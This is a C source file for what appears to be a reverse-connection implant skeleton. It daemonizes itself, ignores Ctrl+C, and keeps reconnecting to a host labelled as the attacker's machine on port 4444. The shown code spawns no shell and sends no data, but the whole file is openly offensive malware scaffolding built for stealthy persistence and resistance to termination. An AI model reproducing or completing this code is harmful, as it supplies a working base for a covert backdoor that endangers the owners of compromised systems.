#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <arpa/inet.h>
#include <signal.h>
#include <errno.h> // For error handling

#define IP "192.168.100.215" // Attacker's machine IP
#define PORT 4444 // Port to use for the connection

// Signal handler to catch SIGINT (Ctrl+C), allowing the program to continue
void handle_sigint(int sig) {
    // Do nothing to block Ctrl+C
}

// Function to attempt a connection and monitor for disconnection
void monitor_connection(struct sockaddr_in *server) {
    int sock;
    int connected = 0; // To track connection status

    while (1) {
        // Create socket
        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == -1) {
            perror("Socket creation failed");
            sleep(2);
            continue;
        }

        // Attempt to connect
        if (connect(sock, (struct sockaddr *)server, sizeof(*server)) == -1) {
            close(sock);
            if (connected) {
                printf("Disconnected!\n"); // Print disconnection message
                connected = 0; // Update connection status
            }
            sleep(2);
            continue;
        }

        if (!connected) {
            connected = 1; // Update connection status
        }

        // Keep connection alive and monitor disconnection
        char buffer[1];
        while (recv(sock, buffer, sizeof(buffer), MSG_PEEK) != 0) {
            // Connection still alive, do nothing
            sleep(1);
        }

        // Disconnection detected
        printf("Disconnected!\n");
        connected = 0; // Update connection status
        close(sock);
    }
}

// Main function
int main() {
    // Ignore SIGINT (Ctrl+C) so the program doesn’t terminate when interrupted
    signal(SIGINT, handle_sigint);

    // Daemonize the program: Run in the background as a daemon
    if (fork() != 0) {
        exit(0); // Parent process exits to detach child process in the background
    }

    if (setsid() == -1) {
        exit(1); // Exit if it’s not possible to detach from terminal
    }

    struct sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(PORT);
    server.sin_addr.s_addr = inet_addr(IP); // Set the server IP address

    // Monitor the connection
    monitor_connection(&server);

    return 0; // End the program if everything fails
}

